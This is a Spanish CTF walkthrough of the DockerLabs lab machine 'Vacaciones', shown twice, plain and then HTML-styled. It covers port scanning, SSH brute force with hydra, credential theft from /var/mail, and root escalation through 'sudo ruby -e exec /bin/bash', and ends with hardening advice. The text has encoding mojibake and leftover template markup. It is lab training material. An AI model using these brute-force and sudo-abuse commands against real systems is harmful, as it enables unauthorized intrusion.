
Writeup - M√°quina "Vacaciones"
Reconocimiento Inicial
Escaneo de Puertos
bash
nmap -sS -p- --min-rate 5000 192.168.x.x
Resultados:

text
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
Enumeraci√≥n del Servicio Web (Puerto 80)
An√°lisis con Burp Suite
Interceptamos la petici√≥n HTTP al navegar al sitio web

Cambiamos el m√©todo HTTP de GET a POST

Encontramos un comentario HTML oculto:

html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
Usuarios Encontrados
Camilo - Usuario mencionado en el comentario

Juan - Remitente del mensaje

Fuerza Bruta al Servicio SSH
Ataque a Camilo
bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://192.168.x.x
Resultado: ‚ùå Contrase√±a encontrada: password1

Accedemos por SSH:

bash
ssh camilo@192.168.x.x
Password: password1
Escalada de Privilegios (Camilo ‚Üí ?)
Reconocimiento Inicial
bash
whoami
# camilo

id
# uid=1000(camilo) gid=1000(camilo) grupos=1000(camilo)

sudo -l
# No hay sudo access
B√∫squeda de Pistas
Recordando el comentario sobre el "correo", investigamos:

bash
ls -la /var/mail/
# Encontramos: juan.txt

cat /var/mail/juan.txt
Contenido del correo:

text
Hola Camilo,

Te dejo mis credenciales por si las necesitas:
Usuario: juan
Contrase√±a: 2k84dicb

Saludos,
Juan
Acceso al Usuario Juan
bash
ssh juan@192.168.x.x
Password: 2k84dicb
Escalada Final (Juan ‚Üí Root)
Verificaci√≥n de Privilegios Sudo
bash
sudo -l
¬°CR√çTICO! Encontramos:

text
User juan may run the following commands on c8c04d750b1b:
    (ALL) NOPASSWD: /usr/bin/ruby
Explotaci√≥n del Binario Ruby
Con ayuda de herramientas de IA, identificamos el m√©todo de explotaci√≥n:

bash
sudo ruby -e 'exec "/bin/bash"'
¬°√âXITO! Obtenemos shell como root:

bash
whoami
# root

id
# uid=0(root) gid=0(root) grupos=0(root)
Resumen de Credenciales
Usuario	Contrase√±a	M√©todo de Obtenci√≥n
camilo	password1	Fuerza bruta con Hydra
juan	2k84dicb	Lectura de /var/mail/juan.txt
root	N/A	Explotaci√≥n de sudo ruby
Ruta de Explotaci√≥n
Reconocimiento ‚Üí Puertos 22 y 80 abiertos

Web ‚Üí M√©todo POST revela comentario oculto

Fuerza Bruta ‚Üí Credenciales de Camilo (password1)

Post-Explotaci√≥n ‚Üí Lectura de correo en /var/mail/

Movimiento Lateral ‚Üí Credenciales de Juan (2k84dicb)

Escalada ‚Üí Abuso de sudo ruby para obtener root

Lecciones Aprendidas
Comentarios HTML pueden contener informaci√≥n sensible

/var/mail/ almacena correos del sistema

sudo -l siempre debe verificarse despu√©s de obtener acceso

Binarios con sudo NOPASSWD son vectores cr√≠ticos de escalada

Ruby/Python/Perl con sudo pueden otorgar shell root directamente

Recomendaciones de Seguridad
Evitar comentarios sensibles en c√≥digo HTML

Implementar autenticaci√≥n de dos factores en SSH

Revisar y limitar privilegios sudo regularmente

Monitorear intentos de fuerza bruta

Usar contrase√±as fuertes y √∫nicas por usuario

M√°quina Completada: ‚úÖ Vacaciones
Dificultad: Media
Tiempo Estimado: 30-45 minutos
Categor√≠as: Web, Fuerza Bruta, Escalada de Privilegios

<style> body { background-color: #0d1117; color: #c9d1d9; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; line-height: 1.6; max-width: 900px; margin: 0 auto; padding: 20px; } h1, h2, h3 { color: #58a6ff; border-bottom: 2px solid #30363d; padding-bottom: 10px; } h1 { text-align: center; color: #f0883e; font-size: 2.5em; margin-bottom: 30px; } code { background-color: #161b22; color: #7ee787; padding: 2px 6px; border-radius: 4px; font-family: 'Monaco', 'Consolas', monospace; border: 1px solid #30363d; } pre { background-color: #161b22; color: #c9d1d9; padding: 15px; border-radius: 6px; border-left: 4px solid #58a6ff; overflow-x: auto; margin: 15px 0; } table { width: 100%; border-collapse: collapse; margin: 20px 0; background-color: #161b22; } th { background-color: #1f6feb; color: white; padding: 12px; text-align: left; } td { padding: 10px; border-bottom: 1px solid #30363d; } tr:hover { background-color: #21262d; } .success { color: #3fb950; font-weight: bold; } .warning { color: #d29922; } .critical { color: #f85149; font-weight: bold; } .note { background-color: rgba(56, 139, 253, 0.1); border-left: 4px solid #388bfd; padding: 12px; margin: 15px 0; border-radius: 0 6px 6px 0; } .step { counter-increment: step-counter; margin-bottom: 25px; padding-left: 40px; position: relative; } .step:before { content: counter(step-counter); background-color: #1f6feb; color: white; width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; position: absolute; left: 0; top: 0; font-weight: bold; } .badge { display: inline-block; padding: 3px 8px; border-radius: 12px; font-size: 0.8em; font-weight: bold; margin: 0 5px; } .badge-web { background-color: #8957e5; color: white; } .badge-priv { background-color: #db6d28; color: white; } .badge-brute { background-color: #ea6045; color: white; } </style>
Writeup - M√°quina "Vacaciones"
<div style="text-align: center; margin-bottom: 30px;"> <span class="badge badge-web">Web</span> <span class="badge badge-brute">Fuerza Bruta</span> <span class="badge badge-priv">Escalada Privilegios</span> </div>
üîç Reconocimiento Inicial
Escaneo de Puertos
bash
nmap -sS -p- --min-rate 5000 -oN scan.txt 192.168.x.x
Resultados:

bash
PORT   STATE SERVICE
22/tcp open  ssh     ‚Üê Servicio SSH
80/tcp open  http    ‚Üê Servicio Web
üåê Enumeraci√≥n del Servicio Web (Puerto 80)
An√°lisis con Burp Suite
<div class="step"> Interceptamos la petici√≥n HTTP al navegar al sitio web </div><div class="step"> Cambiamos el m√©todo HTTP de <code>GET</code> a <code>POST</code> </div><div class="step"> Encontramos un comentario HTML oculto: </div>
html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
üéØ Usuarios Encontrados
Camilo - Usuario mencionado en el comentario

Juan - Remitente del mensaje

<div class="note"> üí° <strong>Insight:</strong> Los comentarios HTML pueden contener informaci√≥n sensible para el pentesting </div>
üí£ Fuerza Bruta al Servicio SSH
Ataque a Camilo
bash
hydra -l camilo -P /usr/share/wordlists/rockyou.txt \
  -t 4 -V ssh://192.168.x.x
Resultado: <span class="critical">‚ùå Contrase√±a encontrada</span>

bash
[22][ssh] host: 192.168.x.x   login: camilo   password: password1
Acceso SSH:

bash
ssh camilo@192.168.x.x
Password: password1
üìà Escalada de Privilegios (Camilo)
Reconocimiento Inicial
bash
whoami    # camilo
id        # uid=1000(camilo) gid=1000(camilo)
sudo -l   # No hay sudo access
üîé B√∫squeda de Pistas
Recordando el comentario sobre el "correo":

bash
ls -la /var/mail/
# total 12
# -rw-r--r-- 1 juan mail 123 Jan 30 22:46 juan.txt

cat /var/mail/juan.txt
<div class="note"> üìß <strong>Contenido del correo:</strong> ``` Hola Camilo,
Te dejo mis credenciales por si las necesitas:
Usuario: juan
Contrase√±a: 2k84dicb

Saludos,
Juan

text
</div>

---

## **üîÑ Movimiento Lateral (Camilo ‚Üí Juan)**

```bash
ssh juan@192.168.x.x
Password: 2k84dicb
üëë Escalada Final (Juan ‚Üí Root)
Verificaci√≥n de Privilegios Sudo
bash
sudo -l
<div class="note critical"> üö® <strong>¬°VULNERABILIDAD CR√çTICA ENCONTRADA!</strong> ``` User juan may run the following commands on c8c04d750b1b: (ALL) NOPASSWD: /usr/bin/ruby ``` </div>
üí• Explotaci√≥n del Binario Ruby
Con ayuda de herramientas de IA, identificamos el m√©todo de explotaci√≥n:

bash
sudo ruby -e 'exec "/bin/bash"'
<div class="note success"> ‚úÖ <strong>¬°ROOT OBTENIDO!</strong> ```bash whoami # root id # uid=0(root) gid=0(root) grupos=0(root) ``` </div>
üîê Resumen de Credenciales
Usuario	Contrase√±a	M√©todo de Obtenci√≥n	Nivel de Acceso
camilo	password1	Fuerza bruta (Hydra)	Usuario normal
juan	2k84dicb	Lectura de /var/mail/juan.txt	Usuario con sudo
root	*N/A*	Explotaci√≥n de sudo ruby	Superusuario
üó∫Ô∏è Ruta de Explotaci√≥n
<div class="step"> <strong>1. Reconocimiento</strong> ‚Üí Puertos 22 y 80 abiertos </div><div class="step"> <strong>2. Web Analysis</strong> ‚Üí M√©todo POST revela comentario oculto </div><div class="step"> <strong>3. Fuerza Bruta</strong> ‚Üí Credenciales de Camilo (<code>password1</code>) </div><div class="step"> <strong>4. Post-Explotaci√≥n</strong> ‚Üí Lectura de correo en <code>/var/mail/</code> </div><div class="step"> <strong>5. Movimiento Lateral</strong> ‚Üí Credenciales de Juan (<code>2k84dicb</code>) </div><div class="step"> <strong>6. Escalada Final</strong> ‚Üí Abuso de <code>sudo ruby</code> para obtener root </div>
üéì Lecciones Aprendidas
üïµÔ∏è Comentarios HTML pueden contener informaci√≥n sensible

üì¨ /var/mail/ almacena correos del sistema (¬°revisar siempre!)

üîç sudo -l debe verificarse inmediatamente despu√©s de obtener acceso

‚ö° Binarios con sudo NOPASSWD son vectores cr√≠ticos de escalada

üêç Ruby/Python/Perl con sudo pueden otorgar shell root directamente

üõ°Ô∏è Recomendaciones de Seguridad
<div class="note"> üîí <strong>Para Administradores:</strong> 1. Evitar comentarios sensibles en c√≥digo HTML 2. Implementar autenticaci√≥n de dos factores en SSH 3. Revisar y limitar privilegios sudo regularmente 4. Monitorear intentos de fuerza bruta 5. Usar contrase√±as fuertes y √∫nicas por usuario 6. Implementar <code>sudo</code> con contrase√±a siempre que sea posible </div>
<div style="text-align: center; margin-top: 40px; padding: 20px; background: linear-gradient(135deg, #1f6feb 0%, #8957e5 100%); border-radius: 10px;"> <h2 style="color: white; margin: 0;">M√°quina Completada</h2> <h1 style="color: #f0883e; margin: 10px 0;">‚úÖ Vacaciones</h1> <div style="display: flex; justify-content: center; gap: 30px; margin-top: 20px;"> <div> <h3 style="color: white;">Dificultad</h3> <p style="color: #c9d1d9; font-size: 1.2em;">Media</p> </div>
text
<div>
  <h3 style="color: white;">Tiempo</h3>
  <p style="color: #c9d1d9; font-size: 1.2em;">30-45 min</p>
</div>

<div>
  <h3 style="color: white;">Categor√≠as</h3>
  <p style="color: #c9d1d9; font-size: 1.2em;">Web, Fuerza Bruta, Privilege Escalation</p>
</div>
</div> </div>
<div style="text-align: center; margin-top: 30px; color: #8b949e; font-size: 0.9em;"> <p>Writeup generado como parte del aprendizaje en DockerLabs</p> <p>M√°quina: <strong>Vacaciones</strong> | Fecha: <strong>$(date +%d/%m/%Y)</strong></p> </div>
